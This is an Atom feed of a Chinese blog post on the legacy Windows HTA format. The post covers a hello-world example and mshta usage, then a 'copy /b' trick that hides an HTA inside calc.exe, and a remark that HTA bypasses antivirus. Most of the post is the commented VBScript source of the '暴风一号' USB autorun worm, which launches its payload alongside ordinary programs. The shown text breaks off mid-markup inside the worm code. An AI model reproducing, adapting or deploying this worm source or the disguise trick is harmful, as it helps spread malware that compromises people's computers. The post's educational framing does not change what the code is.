<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Celestialalpha</title>
  <icon>https://www.gravatar.com/avatar/21c865c371408a7de06b2bf5984bbd6d</icon>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://celestialcode.xyz/"/>
  <updated>2019-05-08T20:26:09.620Z</updated>
  <id>https://celestialcode.xyz/</id>
  
  <author>
    <name>celestialalpha</name>
    <email>celestialcode@outlook.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【老物】MS-HTA格式</title>
    <link href="https://celestialcode.xyz/%E3%80%90%E8%80%81%E7%89%A9%E3%80%91MS-HTA%E6%A0%BC%E5%BC%8F.html"/>
    <id>https://celestialcode.xyz/【老物】MS-HTA格式.html</id>
    <published>2019-05-07T14:02:43.000Z</published>
    <updated>2019-05-08T20:26:09.620Z</updated>
    
    <content type="html"><![CDATA[<p>HTA是Html Application的简写，也就是“基于html技术编写的应用程序”。它是Microsot在很久以前推出一门技术。作为一门技术，它已经很老了（和如今日新月异的前端技术比起来）。<br><a id="more"></a></p><p>查阅网上资料发现，HTA早在99年就已经被提出了，和我差不多大……</p><h1 id="入门教学"><a href="#入门教学" class="headerlink" title="入门教学"></a>入门教学</h1><p>下面是一个简单的实例，将它保存为xx.hta的形式，然后双击运行就可以看到效果。</p><p><strong>语法参考html，如同在编写网页！</strong></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">HTML</span>></span></span><br><span class="line"><span class="tag"><<span class="name">HEAD</span>></span></span><br><span class="line"><span class="tag"><<span class="name">HTA:APPLICATION</span> <span class="attr">ID</span>=<span class="string">"HelloExample"</span> </span></span><br><span class="line"><span class="tag">   <span class="attr">BORDER</span>=<span class="string">"thick"</span> </span></span><br><span class="line"><span class="tag">   <span class="attr">BORDERSTYLE</span>=<span class="string">"complex"</span>/></span></span><br><span class="line"><span class="tag"><<span class="name">TITLE</span>></span>HTA - Hello World<span class="tag"></<span class="name">TITLE</span>></span></span><br><span class="line"><span class="tag"></<span class="name">HEAD</span>></span></span><br><span class="line"><span class="tag"><<span class="name">BODY</span>></span></span><br><span class="line"><span class="tag"><<span class="name">H2</span>></span>HTA - Hello World<span class="tag"></<span class="name">H2</span>></span></span><br><span class="line"><span class="tag"></<span class="name">BODY</span>></span></span><br><span class="line"><span class="tag"></<span class="name">HTML</span>></span></span><br></pre></td></tr></tbody></table></figure><p>HTA支持html和vbscript、jscript（参考javascript），语法却更加随意。有人用HTA做了个简单的俄罗斯砖块，代码很少，不到500行。<br><a href="/uploads/eluosi.hta">点我下载</a>用HTA做的俄罗斯砖块小游戏。</p><p>当执行常规html文件时，执行仅限于web浏览器的安全模型，也就是说它仅限于与服务器通信，操纵页面的对象模型（通常用于验证表单或创建视觉效果）和读或写cookie。<br>而hta作为<strong>完全受信任的应用程序</strong>运行，因此具有比普通html文件更多的权限。例如hta可以<strong>创建、编辑和删除文件和注册表项</strong>。虽然hta在此“可信”环境中运行，但查询Active Directory可能会受到Internet Explorer区域逻辑和相关错误消息的影响。</p><h1 id="mshta命令（Winxp、8、10）"><a href="#mshta命令（Winxp、8、10）" class="headerlink" title="mshta命令（Winxp、8、10）"></a>mshta命令（Winxp、8、10）</h1><p><strong>Windows里用来运行HTA应用的解释器。</strong></p><figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta <span class="variable">%要执行文件的绝对路径%</span></span><br></pre></td></tr></tbody></table></figure><p><strong>HTA是解释运行的，类似于某些脚本语言。</strong>也就是说，只要HTA的那一部分没有破坏，我可以随心所欲的在源文件中添加我想要添加的东西——<br><strong>添加任何二进制数据，甚至在原始HTA文件添加一个完整的exe文件。</strong></p><figure class="highlight taggerscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b <span class="variable">%windir%</span><span class="symbol">\s</span>ystem32<span class="symbol">\c</span>alc.exe+a.hta a1.exe</span><br></pre></td></tr></tbody></table></figure><p>这样制作成的exe文件，双击可以正常打开计算器。但是在命令行下调用mshta解释器会解释运行其中的HTA文档。</p><p><img src="/uploads/hta_hack.jpg" alt></p><h1 id="暴风一号（病毒）"><a href="#暴风一号（病毒）" class="headerlink" title="暴风一号（病毒）"></a>暴风一号（病毒）</h1><p>HTA格式相比于普通html文件具有如下特点：</p><ul><li>都基于html动态脚本语言编写</li><li>HTA系统访问不受限制（不存在sandbox保护）</li><li>HTA可以方便的绕过AV程序，它们的行为不像普通html那样被严格控制</li></ul><p>暴风一号，原名Worm.Script.VBS.Autorun.be。这是一个由VBS脚本编写、采用加密和自变形手段，通过U盘传播的恶意蠕虫病毒。病毒行为包括：<strong>自变形</strong>、<strong>自复制</strong>、<strong>该注册表</strong>、<strong>遍历文件夹</strong>、<strong>关闭弹出光驱</strong>、<strong>锁定计算机</strong>、<strong>进程异常</strong>等。<br>这是一个VBS病毒，可惜<strong>Microsoft已经彻底放弃把VBS作为前端语言了</strong>。现在VBS主要用来做些自动化，写点病毒什么的。</p><p>下面是“暴风一号”的真正源码。</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br></pre></td><td class="code"><pre><span class="line">On Error Resume Next '//屏蔽出错信息，发生错误时继续向下执行</span><br><span class="line">Dim Fso,WshShell '//定义了两个变量</span><br><span class="line"></span><br><span class="line">'//创建并返回对 Automation 对象的引用。</span><br><span class="line">'//CreateObject(servername.typename [, location])</span><br><span class="line">'//servername 必选项。提供对象的应用程序名称。</span><br><span class="line">'//typename 必选项。要创建的对象类型或类。</span><br><span class="line">'//location 可选项。对象所在的网络服务器将被创建。</span><br><span class="line">'//说明Automation 服务器至少提供一种对象类型。例如，字处理应用程序可以提供应用程序对象、文档对象和工具条对象。</span><br><span class="line"></span><br><span class="line">Set Fso=CreateObject("scRiPTinG.fiLEsysTeMoBjEcT") '//为变量Fso赋值 创建 Scripting.FileSystemObject 对象 提供对计算机文件系统的访问</span><br><span class="line">Set WshShell=CreateObject("wScRipT.SHelL") '//为变量WshShell赋值 创建Wscript.Shell对象 用于获取系统环境变量的访问、创建快捷方式、访问Windows的特殊文件夹，</span><br><span class="line">                       '//以及添加或删除注册表条目。还可以使用Shell对象的功能创建更多的定制对话框以进行用户交互。</span><br><span class="line">Call Main() '//call 将控制权传递到sub或function</span><br><span class="line">Sub Main() '//sub、function 两种表示方法 sub没有返回值，function有返回值</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Args, VirusLoad, VirusAss</span><br><span class="line">    Set Args=WScript.Arguments '//返回wsh对象的参数集</span><br><span class="line">    VirusLoad=GetMainVirus(1)  '//获得System文件夹下smss.exe 蠕虫地址</span><br><span class="line">    VirusAss=GetMainVirus(0)   '//获得Windows文件夹下explorer.exe 蠕虫地址</span><br><span class="line">    ArgNum=0</span><br><span class="line">   </span><br><span class="line">    Do While ArgNum <span class="tag">< <span class="attr">Args.Count</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Param</span>=<span class="string">Param&</span>" "&<span class="attr">Args</span>(<span class="attr">ArgNum</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">ArgNum</span>=<span class="string">ArgNum</span> + <span class="attr">1</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Loop</span></span></span><br><span class="line"><span class="tag">    <span class="attr">SubParam</span>=<span class="string">LCase(Right(Param,</span> <span class="attr">3</span>)) '//<span class="attr">LCase</span> 返回字符串的小写形式 <span class="attr">Right</span> 从字符串右边返回指定数目的字符</span></span><br><span class="line"><span class="tag">   </span></span><br><span class="line"><span class="tag">    <span class="attr">Select</span> <span class="attr">Case</span> <span class="attr">SubParam</span> '//<span class="attr">select</span>类似<span class="attr">switch</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">run</span>" '//当运行<span class="attr">run</span>时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">Left(WScript.ScriptFullName,</span> <span class="attr">2</span>) '//<span class="attr">ScriptFullName</span>属性返回当前正在运行的脚本的完整路径。该属性返回一个只读的字符串。</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">txt</span>", "<span class="attr">log</span>","<span class="attr">ini</span>" ,"<span class="attr">inf</span>" '//运行"<span class="attr">txt</span>", "<span class="attr">log</span>", "<span class="attr">ini</span>", "<span class="attr">inf</span>"后缀名文件时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"%SystemRoot%/system32/NOTEPAD.EXE "</span>&<span class="attr">Param</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">bat</span>", "<span class="attr">cmd</span>" '//运行"<span class="attr">bat</span>", "<span class="attr">cmd</span>"批处理或命令提示符时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"CMD /c echo Hi!I'm here!&pause"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">reg</span>" '//运行"<span class="attr">reg</span>"注册表导入程序时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"regedit.exe "</span>&""""&<span class="attr">Trim</span>(<span class="attr">Param</span>)&""""</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">chm</span>" '//运行"<span class="attr">chm</span>"帮助文件时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"hh.exe "</span>&""""&<span class="attr">Trim</span>(<span class="attr">Param</span>)&""""</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">hlp</span>" '//运行"<span class="attr">hlp</span>"帮助文件时，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"winhlp32.exe "</span>&""""&<span class="attr">Trim</span>(<span class="attr">Param</span>)&""""</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">dir</span>" '//运行<span class="attr">dir</span>命令，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">""</span>""&<span class="attr">Left</span>(<span class="attr">Trim</span>(<span class="attr">Param</span>),<span class="attr">Len</span>(<span class="attr">Trim</span>(<span class="attr">Param</span>))<span class="attr">-3</span>)&""""</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">oie</span>" '//打开我<span class="attr">IE</span>图标，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">""</span>"%<span class="attr">ProgramFiles</span>%/<span class="attr">Internet</span> <span class="attr">Explorer</span>/<span class="attr">IEXPLORE.EXE</span>"""</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span class="attr">SystemRoot</span>%/<span class="attr">system</span>/<span class="attr">svchost.exe</span> "&<span class="attr">VirusLoad</span>)</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">Case</span> "<span class="attr">omc</span>" '//打开我的电脑图标，同时启动病毒文件</span></span><br><span class="line"><span class="tag">        <span class="attr">RunPath</span>=<span class="string">"explorer.exe /n,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>(<span class="attr">RunPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">InvadeSystem</span>(<span class="attr">VirusLoad</span>,<span class="attr">VirusAss</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">Run</span>("%<span 